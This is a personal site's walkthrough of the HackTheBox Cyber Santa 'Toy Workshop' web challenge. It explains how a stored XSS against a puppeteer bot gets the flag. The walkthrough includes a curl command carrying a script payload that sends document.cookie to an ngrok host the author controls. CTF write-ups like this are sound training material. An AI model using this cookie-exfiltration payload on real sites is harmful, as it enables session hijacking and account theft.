<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.13">
<link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Nathan&#39;s Website RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Nathan&#39;s Website Atom Feed"><title data-react-helmet="true">Toy Workshop - Web | Nathan&#x27;s Website</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://albinogazelle.github.io/docs/HTB - Cyber Santa/toy_workshop"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_version" content="current"><meta data-react-helmet="true" name="docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="Toy Workshop - Web | Nathan&#x27;s Website"><meta data-react-helmet="true" name="description" content="Walkthrough for the HackTheBox 2021 Cyber Santa competition challenge Toy Workshop in the web category."><meta data-react-helmet="true" property="og:description" content="Walkthrough for the HackTheBox 2021 Cyber Santa competition challenge Toy Workshop in the web category."><link data-react-helmet="true" rel="icon" href="/img/favicon.svg"><link data-react-helmet="true" rel="canonical" href="https://albinogazelle.github.io/docs/HTB - Cyber Santa/toy_workshop"><link data-react-helmet="true" rel="alternate" href="https://albinogazelle.github.io/docs/HTB - Cyber Santa/toy_workshop" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://albinogazelle.github.io/docs/HTB - Cyber Santa/toy_workshop" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.7b97efba.css">
<link rel="preload" href="/assets/js/runtime~main.7b042230.js" as="script">
<link rel="preload" href="/assets/js/main.c693b28c.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/dice.svg" alt="Home Logo" class="themedImage_TMUO themedImage--light_4Vu1"><img src="/img/dice.svg" alt="Home Logo" class="themedImage_TMUO themedImage--dark_uzRr"></div><b class="navbar__title">Home</b></a><a class="navbar__item navbar__link navbar__link--active" href="/docs/welcome">Docs</a><a class="navbar__item navbar__link" href="/blog">Blog</a></div><div class="navbar__items navbar__items--right"><div class="toggle_iYfV toggle_2i4l toggleChecked_a04y toggleDisabled_xj38"><div class="toggleTrack_t-f2" role="button" tabindex="-1"><div class="toggleTrackCheck_mk7D"><span class="toggleIcon_pHJ9">ðŸŒœ</span></div><div class="toggleTrackX_dm8H"><span class="toggleIcon_pHJ9">ðŸŒž</span></div><div class="toggleTrackThumb_W6To"></div></div><input type="checkbox" checked="" class="toggleScreenReader_h9qa" aria-label="Switch between dark and light mode"></div><div class="navbar__search searchBarContainer_I7kZ"><input placeholder="Search" aria-label="Search" class="navbar__search-input"><div class="loadingRing_Zg7X searchBarLoadingRing_J5Ez"><div></div><div></div><div></div><div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_lDyR"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_i9tI" type="button"></button><aside class="docSidebarContainer_0YBq"><div class="sidebar_a3j0"><nav class="menu thin-scrollbar menu_cyFh"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/welcome">Welcome!</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist hasHref_TwRn" href="/docs/HTB - Horizontall/notes">HTB - Horizontall</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active hasHref_TwRn" href="/docs/HTB - Cyber Santa/baby_apt">HTB - Cyber Santa</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/HTB - Cyber Santa/baby_apt">Baby Apt - Forensics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/HTB - Cyber Santa/toy_workshop">Toy Workshop - Web</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/network_mon">Tutorial - Lightweight Networking Monitoring</a></li></ul></nav></div></aside><main class="docMainContainer_r8cw"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_zHA2"><div class="docItemContainer_oiyr"><article><div class="tocCollapsible_aw-L theme-doc-toc-mobile tocMobile_Tx6Y"><button type="button" class="clean-btn tocCollapsibleButton_zr6a">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Toy Workshop - Web</h1></header><h2 class="anchor anchorWithStickyNavbar_y2LR" id="challenge-name-toy-workshop">Challenge Name: Toy Workshop<a aria-hidden="true" class="hash-link" href="#challenge-name-toy-workshop" title="Direct link to heading">â€‹</a></h2><h3 class="anchor anchorWithStickyNavbar_y2LR" id="topic-web">Topic: Web<a aria-hidden="true" class="hash-link" href="#topic-web" title="Direct link to heading">â€‹</a></h3><h3 class="anchor anchorWithStickyNavbar_y2LR" id="challenge-prompt">Challenge Prompt<a aria-hidden="true" class="hash-link" href="#challenge-prompt" title="Direct link to heading">â€‹</a></h3><p><code>The work is going well on Santa&#x27;s toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?</code></p><h3 class="anchor anchorWithStickyNavbar_y2LR" id="walkthrough">Walkthrough<a aria-hidden="true" class="hash-link" href="#walkthrough" title="Direct link to heading">â€‹</a></h3><p>This challenge has both a downloadable part and a docker service to accompany it. Download the challenge archive and extract it to see it&#x27;s a node webserver.<br>
<!-- -->Start the docker service, going to that service brings us to a fun little animation of packages moving on a conveyor belt.<br>
<!-- -->Looking through the code given to use, we can see the internal workings of what is presumably running on the docker service. This webserver has a couple interesting files, notably:
<code>database.js</code><br>
<code>routes/index.js</code><br>
<code>bot.js</code>  </p><p>Lets look at <code>routes/index.js</code> first. We can see a route to <code>/api/submit</code> that allows post requests. It looks like its adding a &quot;query&quot; in a sqlite3 db that gets retrieved later. We see there&#x27;s another endpoint at <code>/queries</code> that displays the queries submitted to <code>/api/submit</code> endpoint. It has a localhost restriction on it though, so my first though it some sort of xss attack later on.<br>
<!-- -->Switching over to <code>bot.js</code>, we see this is where the flag is being set as cookies and where puppeteer is being setup to navigate to the <code>/queries</code> endpoint as localhost. This has confirmed the earlier suspicion that it is an XSS attack.</p><p>Looking at <code>database.js</code>, we can see the logic for inserting queries into the database and for displaying them later on. I got stuck on this code for awhile, but it&#x27;s not as important as the other two.  </p><p>Lets send some test queries to <code>/api/submit</code> using curl and see what we get back.</p><p>Command: <code>curl -H &quot;Content-Type: application/json&quot; -d &#x27;{&quot;query&quot;: &quot;1234&quot;}&#x27; -X POST 138.68.184.31:30881/api/submit</code>   </p><p>Response: <code>{&quot;message&quot;:&quot;Your message is delivered successfully!&quot;}</code></p><p>We knew what parameters to supply due to having access to the source code, more specifically that information is found in <code>routes/index.js</code> on line 15: <code>const { query } = req.body;</code>  </p><p>So we know so far that it&#x27;s most likely an XSS attack since puppeteer is being used to access the <code>/queries</code> endpoint as localhost so lets send some payloads and see what happens.<br>
<!-- -->Command: <code>curl -H &quot;Content-Type: application/json&quot; -d &#x27;{&quot;query&quot;: &quot;&lt;script&gt;console.log(document.cookie)&lt;/script&gt;}&#x27; -X POST http://138.68.184.31:32360/api/submit</code><br>
<!-- -->Response: <code>{&quot;message&quot;:&quot;Your message is delivered successfully!&quot;}</code></p><p>But we have an issue, we can&#x27;t access <code>/queries</code> where the XSS attack will be executed, also this attack will only display our cookies to the console. Not send them to a place we can access. Luckily there&#x27;s a solution to this issue and it&#x27;s called <code>ngrok</code>.  </p><p>Ngrok allows you to tunnel a localhost webserver onto the wide internet. We can do this by first creating a directory for the webserver, then running <code>python -m http.server &amp;</code> and then <code>ngrok http 8000</code>, after executing that command we&#x27;ll be given a domain name to use in our attacks.</p><p>Now lets try an attack from a really useful resource over at <a href="https://0xhorizon.eu/cheat-sheet/xss/" target="_blank" rel="noopener noreferrer">https://0xhorizon.eu/cheat-sheet/xss/</a>. The &quot;get cookies from another user&quot; is exactly what we&#x27;re looking for. Modifying it with out ngrok domain gives us the following payload:<br>
<code>&lt;script&gt;document.location.replace(\&quot;http://2774-2601-602-87f-9853-7df0-274a-fd62-32ae.ngrok.io?cookie=\&quot;+document.cookie)&lt;/script&gt;&quot;</code> <em>note the escaped strings, that got me for awhile</em></p><p>Inserting this into our curl command gives us the following complete payload:
<code>curl -H &quot;Content-Type: application/json&quot; -d &#x27;{&quot;query&quot;: &quot;&lt;script&gt;document.location.replace(\&quot;http://2774-2601-602-87f-9853-7df0-274a-fd62-32ae.ngrok.io?cookie=\&quot;+document.cookie)&lt;/script&gt;&quot;}&#x27; -X POST 138.68.184.31:30881/api/submit</code> Execute this payload and wait a couple of seconds and the flag should show in the terminal tab with ngrok:</p><p><img alt="image" src="/assets/images/flag_ngrok-90da0f460c6bdb8d47b82e7467d83a99.png"></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/docs/HTB - Cyber Santa/baby_apt"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Â« <!-- -->Baby Apt - Forensics</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/docs/network_mon"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Tutorial - Lightweight Networking Monitoring<!-- --> Â»</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_vrFS thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#challenge-name-toy-workshop" class="table-of-contents__link toc-highlight">Challenge Name: Toy Workshop</a><ul><li><a href="#topic-web" class="table-of-contents__link toc-highlight">Topic: Web</a></li><li><a href="#challenge-prompt" class="table-of-contents__link toc-highlight">Challenge Prompt</a></li><li><a href="#walkthrough" class="table-of-contents__link toc-highlight">Walkthrough</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/docs/welcome">Docs and Tutorials</a></li></ul></div><div class="col footer__col"><div class="footer__title">Socials</div><ul class="footer__items"><li class="footer__item"><a href="https://github.com/AlbinoGazelle" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://www.linkedin.com/in/nathan-burns-3613351b5/" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a href="https://wwucyber.com" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>WWU Cybersecurity Club<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2021 Nathan Burns. Built with Docusaurus.</div></div></div></footer></div>
<script src="/assets/js/runtime~main.7b042230.js"></script>
<script src="/assets/js/main.c693b28c.js"></script>
</body>
</html>